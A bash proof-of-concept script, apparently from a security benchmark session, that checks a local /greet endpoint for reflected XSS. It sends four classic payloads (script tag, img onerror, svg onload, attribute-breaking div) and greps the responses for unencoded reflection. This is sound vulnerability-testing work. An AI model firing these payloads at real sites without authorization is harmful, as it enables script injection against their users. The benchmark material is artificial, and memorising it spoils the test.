#!/bin/bash
# POC: Demonstrates Reflected XSS vulnerability in /greet endpoint via the 'name' parameter. Tests multiple XSS payloads and verifies that user input is reflected without HTML entity encoding.
# Target: ./repo
# Created: 2025-11-07T21:36:23.698Z
# Session: benchmark-XBEN-076-24-mhpdcdue

# Reflected XSS POC for /greet endpoint
# This script tests for XSS vulnerabilities in the name parameter

TARGET_URL="http://localhost:5000/greet"

echo "=========================================="
echo "Reflected XSS POC - /greet Endpoint"
echo "=========================================="
echo ""

# Test 1: Script tag payload
echo "[*] Test 1: Script tag XSS payload"
PAYLOAD1='<script>alert(1)</script>'
RESPONSE1=$(curl -s "${TARGET_URL}?name=${PAYLOAD1}")
echo "Payload: ${PAYLOAD1}"
echo "Response: ${RESPONSE1}"
if echo "${RESPONSE1}" | grep -q "<script>alert(1)</script>"; then
    echo "[✓] VULNERABLE: Script tag payload reflected without encoding"
else
    echo "[✗] Not vulnerable or already escaped"
fi
echo ""

# Test 2: IMG tag with onerror
echo "[*] Test 2: IMG tag with onerror attribute"
PAYLOAD2='<img src=x onerror=alert(1)>'
RESPONSE2=$(curl -s "${TARGET_URL}?name=${PAYLOAD2}")
echo "Payload: ${PAYLOAD2}"
echo "Response: ${RESPONSE2}"
if echo "${RESPONSE2}" | grep -q "<img src=x onerror=alert(1)>"; then
    echo "[✓] VULNERABLE: IMG tag payload reflected without encoding"
else
    echo "[✗] Not vulnerable or already escaped"
fi
echo ""

# Test 3: SVG tag with onload
echo "[*] Test 3: SVG tag with onload attribute"
PAYLOAD3='<svg onload=alert(1)>'
RESPONSE3=$(curl -s "${TARGET_URL}?name=${PAYLOAD3}")
echo "Payload: ${PAYLOAD3}"
echo "Response: ${RESPONSE3}"
if echo "${RESPONSE3}" | grep -q "<svg onload=alert(1)>"; then
    echo "[✓] VULNERABLE: SVG tag payload reflected without encoding"
else
    echo "[✗] Not vulnerable or already escaped"
fi
echo ""

# Test 4: Event handler on div
echo "[*] Test 4: Event handler on div element"
PAYLOAD4='"><div onmouseover=alert(1)>'
RESPONSE4=$(curl -s "${TARGET_URL}?name=${PAYLOAD4}")
echo "Payload: ${PAYLOAD4}"
echo "Response: ${RESPONSE4}"
if echo "${RESPONSE4}" | grep -q "onmouseover=alert(1)"; then
    echo "[✓] VULNERABLE: Event handler payload reflected without encoding"
else
    echo "[✗] Not vulnerable or already escaped"
fi
echo ""

echo "=========================================="
echo "POC Completed"
echo "=========================================="